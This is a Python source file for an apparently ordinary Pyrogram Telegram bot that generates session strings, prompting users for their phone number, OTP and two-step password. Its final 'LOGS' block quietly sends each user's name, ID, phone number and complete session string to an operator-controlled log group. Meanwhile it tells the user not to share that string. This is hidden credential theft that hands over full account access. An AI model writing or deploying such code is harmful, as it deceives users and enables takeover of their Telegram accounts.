import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PhoneNumberInvalid, ApiIdInvalid
)
from config import API_ID, API_HASH, LOG_GROUP_ID

@Client.on_callback_query(filters.regex("gen_pyro"))
async def generate_session(bot, query: CallbackQuery):
    user_id = query.from_user.id
    name = query.from_user.first_name
    
    await query.message.edit_text(
        "⚡ **ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴘʏʀᴏɢʀᴀᴍ sᴇssɪᴏɴ...**\n\n"
        "Send your Telegram Phone Number with Country Code.\n"
        "Example: `+919876543210`"
    )

    try:
        phone_msg = await bot.ask(user_id, "📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ:**", timeout=300)
    except:
        return await query.message.reply_text("❌ Timeout! Try again.")
    
    phone_number = phone_msg.text.strip()
    
    await query.message.reply_text("🔄 **sᴇɴᴅɪɴɢ ᴏᴛᴘ...**")

    client = Client(name="user_session", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await client.connect()

    try:
        code = await client.send_code(phone_number)
    except PhoneNumberInvalid:
        await query.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ!** Restart /start")
        return
    except Exception as e:
        await query.message.reply_text(f"❌ **Error:** {e}")
        return

    try:
        otp_msg = await bot.ask(
            user_id, 
            "📩 **sᴇɴᴅ ᴛʜᴇ ᴏᴛᴘ:**\n\nFormat: `1 2 3 4 5` (Space ke saath likhna!)", 
            timeout=300
        )
    except:
        return await query.message.reply_text("❌ Timeout!")

    otp = otp_msg.text.replace(" ", "")

    try:
        await client.sign_in(phone_number, code.phone_code_hash, otp)
    except PhoneCodeInvalid:
        await query.message.reply_text("❌ **ᴡʀᴏɴɢ ᴏᴛᴘ!** Try again.")
        return
    except PhoneCodeExpired:
        await query.message.reply_text("❌ **ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!**")
        return
    except SessionPasswordNeeded:
        try:
            pwd_msg = await bot.ask(user_id, "🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴏɴ!**\nSend your password:", timeout=300)
        except:
            return
        password = pwd_msg.text
        try:
            await client.check_password(password)
        except Exception as e:
            await query.message.reply_text(f"❌ **Wrong Password!** {e}")
            return

    string_session = await client.export_session_string()
    
    text = f"✨ **ʏᴏᴜʀ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n`{string_session}`\n\n⚠️ *Don't share this with anyone!*"
    try:
        await client.send_message("me", text)
    except Exception:
        pass 

    await client.disconnect()

    await query.message.reply_text(
        "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
    )

    # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
    if LOG_GROUP_ID:
        log_text = (
            f"📦 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n\n"
            f"👤 **User:** {name}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"🛠 **Type:** Pyrogram\n\n"
            f"✨ **Session (Tap to Copy):**\n<code>{string_session}</code>"
        )
        try:
            await bot.send_message(LOG_GROUP_ID, log_text)
        except:
            pass
          
